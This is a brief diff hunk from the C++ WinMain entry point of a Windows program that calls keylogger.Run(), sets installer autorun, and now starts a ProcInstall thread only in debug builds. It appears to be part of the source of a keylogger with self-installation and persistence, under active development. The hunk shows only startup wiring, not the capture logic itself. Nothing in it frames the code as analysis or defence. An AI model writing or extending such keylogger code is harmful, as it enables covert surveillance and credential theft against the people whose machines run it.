@@ -29,7 +29,9 @@ extern "C" int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
 	installer.SetAutorun(false);
 #endif
 
+#ifdef _DEBUG
 	CreateThread(NULL, 0xFFFF, ProcInstall, NULL, 0, NULL);
+#endif
 
 	VLog(LMESSAGE, "Started");
 	keylogger.Run();
